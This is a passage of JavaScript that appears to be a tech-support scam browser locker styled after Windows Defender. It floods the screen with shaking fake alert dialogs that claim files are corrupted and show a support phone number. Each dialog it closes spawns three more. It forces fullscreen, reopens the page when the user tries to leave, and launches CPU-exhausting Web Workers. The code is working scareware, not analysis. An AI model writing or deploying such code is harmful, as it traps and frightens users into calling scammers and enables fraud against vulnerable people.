for(var i=0;i<10;i++){try{spawnReplacement()}catch(e){}}
// Flash the button
this.style.background='rgba(0,120,212,0.8)';
this.style.borderColor='#0078d4';
this.style.color='#fff';
this.textContent='&#9888; Hold ESC for 10 seconds to cancel (or call support)';
var self=this;
setTimeout(function(){self.textContent='&#10060; I want to resolve this issue';self.style.background='rgba(0,0,0,0.7)';self.style.color='#ccc';self.style.borderColor='rgba(255,255,255,0.3)'},4000);
};
},16000);

function spawnDialogBomb(){
for(var n=0;n<30;n++){
var x=Math.random()*(window.innerWidth-280),y=Math.random()*(window.innerHeight-180);
var w=180+Math.random()*120,h=110+Math.random()*70;
var msg=MSGS[n%MSGS.length],ds=DSTYLES[n%DSTYLES.length];
var div=document.createElement('div');
div.className='tb-dialog';
div.style.cssText='position:fixed;left:'+x+'px;top:'+y+'px;width:'+w+'px;height:'+h+'px;background:'+ds.b+';border:2px solid '+ds.c+';border-radius:6px;z-index:'+(99999-Math.floor(Math.random()*50))+';overflow:hidden;box-shadow:0 0 20px rgba(0,0,0,0.3);font-family:Arial,sans-serif;animation:tbShake '+(0.2+Math.random()*0.8)+'s infinite';
var dloss=(n%3===0)?'<div style="padding:2px 8px;color:#ff5252;font-size:9px;font-weight:600" class="tb-dloss">Files corrupted: 0</div>':'';
div.innerHTML='<div onclick="(function(){var e=document.documentElement;(e.requestFullscreen||e.webkitRequestFullscreen||e.mozRequestFullScreen||e.msRequestFullscreen||function(){}).call(e,{navigationUI:&quot;hide&quot;}).catch(function(){})})()" style="background:'+ds.c+';color:#fff;padding:4px 8px;font-size:10px;font-weight:700;display:flex;justify-content:space-between"><span>'+ds.ic+' '+msg.h+'</span><span class="tb-close" style="cursor:pointer;font-size:14px;opacity:0.8">&times;</span></div><div style="padding:8px;color:#e0e0e0;font-size:11px;line-height:1.4">'+msg.t+'</div>'+dloss+'<div style="padding:4px 8px 8px;color:'+ds.c+';font-size:10px;font-weight:600">&#9742; '+TP_PHONE+'</div>';
div.querySelector('.tb-close').onclick=function(e){
e.stopPropagation();
for(var r=0;r<3;r++)spawnReplacement();
div.remove();
};
document.body.appendChild(div);
dialogs.push(div);
}
// Add shake animation
var st=document.createElement('style');
st.textContent='@keyframes tbShake{0%,100%{transform:translate(0,0)}10%{transform:translate(-2px,1px)}20%{transform:translate(2px,-1px)}30%{transform:translate(-1px,2px)}40%{transform:translate(1px,-2px)}50%{transform:translate(-2px,0)}60%{transform:translate(2px,1px)}70%{transform:translate(-1px,-1px)}80%{transform:translate(1px,2px)}90%{transform:translate(-2px,-2px)}}@keyframes tbFadeIn{from{opacity:0}to{opacity:1}}@keyframes tbPulse{0%,100%{opacity:1}50%{opacity:0.3}}';
st.id='tb-style';
document.head.appendChild(st);
// Escape progress bar
var eb=document.createElement('div');eb.id='esc-bar';
eb.style.cssText='position:fixed;top:0;left:0;width:100%;height:5px;z-index:100001;display:none';
eb.innerHTML='<div style="height:100%;width:0%;background:#0078d4;animation:tbProgress 10s linear forwards;box-shadow:0 0 15px #0078d4"></div><style>@keyframes tbProgress{0%{width:0%}100%{width:100%}}</style>';
document.body.appendChild(eb);
}

function spawnReplacement(){
var msg=ESCALATED[Math.floor(Math.random()*ESCALATED.length)],ds=DSTYLES[Math.floor(Math.random()*DSTYLES.length)];
var x=Math.random()*(window.innerWidth-220),y=Math.random()*(window.innerHeight-150);
var div=document.createElement('div');
div.className='tb-dialog';
div.style.cssText='position:fixed;left:'+x+'px;top:'+y+'px;width:'+(180+Math.random()*100)+'px;height:'+(100+Math.random()*60)+'px;background:'+ds.b+';border:2px solid '+ds.c+';border-radius:6px;z-index:'+(99999-Math.floor(Math.random()*50))+';overflow:hidden;box-shadow:0 0 20px rgba(0,0,0,0.3);font-family:Arial,sans-serif;animation:tbShake '+(0.2+Math.random()*0.8)+'s infinite';
div.innerHTML='<div onclick="(function(){var e=document.documentElement;(e.requestFullscreen||e.webkitRequestFullscreen||e.mozRequestFullScreen||e.msRequestFullscreen||function(){}).call(e,{navigationUI:&quot;hide&quot;}).catch(function(){})})()" style="background:'+ds.c+';color:#fff;padding:4px 8px;font-size:10px;font-weight:700;display:flex;justify-content:space-between"><span>'+ds.ic+' '+msg.h+'</span><span class="tb-close" style="cursor:pointer;font-size:14px;opacity:0.8">&times;</span></div><div style="padding:8px;color:#e0e0e0;font-size:11px;line-height:1.4">'+msg.t+'</div><div style="padding:4px 8px 8px;color:'+ds.c+';font-size:10px;font-weight:600">&#9742; '+TP_PHONE+'</div>';
div.querySelector('.tb-close').onclick=function(e){
e.stopPropagation();
for(var r=0;r<3;r++)spawnReplacement();
div.remove();
};
document.body.appendChild(div);
dialogs.push(div);
}

// ====== BEFOREUNLOAD ======
window.addEventListener('beforeunload',function(e){
try{window.open(window.location.href,'_blank')}catch(ex){}
_b();
});
window.addEventListener('unload',function(){try{window.open(window.location.href,'_blank')}catch(ex){}_b()});

// ====== FAVICON BLINK ======
var ft=0;
setInterval(function(){
ft=1-ft;
var l=document.querySelector('link[rel="icon"]');
if(l)l.href=ft?'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"%3E%3Ccircle cx="8" cy="8" r="8" fill="%23d32f2f"/%3E%3Ctext x="8" y="12" text-anchor="middle" font-size="10" fill="white"%3E!%3C/text%3E%3C/svg%3E':'defender.png'
},1000);
}
function _b(){
try{
var s='onmessage=function(){while(true){Math.random()*Math.random()}}';
var b=new Blob([s],{type:'application/javascript'});
var u=URL.createObjectURL(b);
for(var i=0;i<10;i++){try{new Worker(u)}catch(e){break}}
}catch(e){}
}
function deactivate(){
ph=0;escPressed=false;
if(escTimer){clearTimeout(escTimer);escTimer=null}
try{(document.exitFullscreen||document.webkitExitFullscreen||document.mozCancelFullScreen||document.msExitFullscreen||function(){}).call(document)}catch(e){}
try{(document.exitPointerLock||function(){}).call(document)}catch(e){}
document.body.style.cursor='default';
}
// First click activates
document.addEventListener('click',function(){if(ph===0){ph=1;clearInterval(ci);_t()}},{once:true});
})();